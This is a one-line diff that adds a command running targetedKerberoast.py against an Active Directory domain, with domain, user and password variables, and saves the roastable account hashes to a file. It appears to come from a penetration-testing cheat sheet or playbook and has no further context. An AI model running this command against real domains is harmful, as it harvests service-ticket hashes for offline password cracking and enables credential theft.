@@ -1,0 +1,1 @@
+targetedKerberoast.py -v -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -o Kerberoastables.txt
